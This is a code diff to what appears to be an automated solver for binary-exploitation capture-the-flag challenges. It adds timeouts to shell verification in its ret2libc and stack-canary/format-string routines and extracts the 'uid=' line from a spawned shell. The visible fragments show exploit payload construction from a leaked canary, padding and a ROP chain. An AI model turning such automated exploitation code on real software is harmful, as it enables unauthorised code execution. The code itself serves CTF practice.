@@ -10,7 +10,7 @@ from typing import Optional
 
 from .facts import Facts, analyse
 from .model import Challenge
-from .run import Result, execute, execute_flag
+from .run import Result, execute, execute_flag, _verify_timeout
 from . import strategies as S
 
 
@@ -130,6 +130,10 @@ def solve(ch: Challenge, max_attempts: int = 80, verbose: bool = True,
             res.attempts.append(att)
             if ok:
                 res.ok = True
+                import re as _re
+                m = _re.search(rb"uid=\d+\(([^)]*)\)", out or b"")
+                if m:
+                    detail = (detail + " | " if detail else "") + m.group(0).decode("latin-1")
                 if plan.tag == "flag":
                     res.flag_only = True
                 res.strategy = plan.strategy
@@ -201,7 +205,7 @@ def _try_ret2libc(ch: Challenge, f: Facts, plan: S.Plan):
                 break
             _t.sleep(0.2)
             out += p.recvrepeat(0.15)
-            r = verify_shell(p)
+            r = verify_shell(p, timeout=_verify_timeout(ch))
             out += r.output
             if r.ok:
                 return True, detail, out
@@ -298,7 +302,7 @@ def _try_canary_fmt(ch: Challenge, f: Facts, plan: S.Plan):
             stage2 = pad + ch.p64(canary) + tail + chain2
             p.send(stage2 + (b"\n" if sink in S.TERM_SINKS else b""))
             _t.sleep(0.2)
-            r = verify_shell(p)
+            r = verify_shell(p, timeout=_verify_timeout(ch))
             out += r.output
             if r.ok:
                 return True, f"canary={hex(canary)} base={hex(base)}", out
